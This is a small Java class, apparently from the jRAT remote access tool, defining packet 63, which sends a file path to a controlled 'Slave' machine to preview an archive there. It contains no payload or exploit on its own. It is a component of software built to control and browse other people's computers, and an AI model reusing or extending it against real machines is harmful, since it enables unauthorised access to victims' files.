package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.client.Slave;


public class Packet63PreviewArchive extends AbstractOutgoingPacket {

	private String file;

	public Packet63PreviewArchive(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public byte getPacketId() {
		return 63;
	}

}